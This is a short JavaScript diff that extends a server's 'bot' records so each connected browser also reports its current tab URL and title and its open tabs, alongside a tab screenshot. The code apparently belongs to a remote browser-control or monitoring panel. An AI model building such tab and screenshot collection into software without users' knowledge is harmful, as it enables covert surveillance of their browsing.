@@ -64,6 +64,11 @@ async function ping(websocket_connection, params) {
     });
     await bot.update({
         is_online: true,
+        current_tab: {
+            "url": params.current_tab.url,
+            "title": params.current_tab.title,
+        },
+        tabs:params.tabs,
         current_tab_image: params.current_tab_image
     });
 }
@@ -438,7 +443,7 @@ async function initialize_new_browser_connection(ws) {
             'is_authenticated': true,
             'is_online': true,
             'user_agent': user_agent,
-            'current_tab':'',
+            'current_tab':{},
             'current_tab_image':'',
             'tabs':{},
             'bookmarks':{}
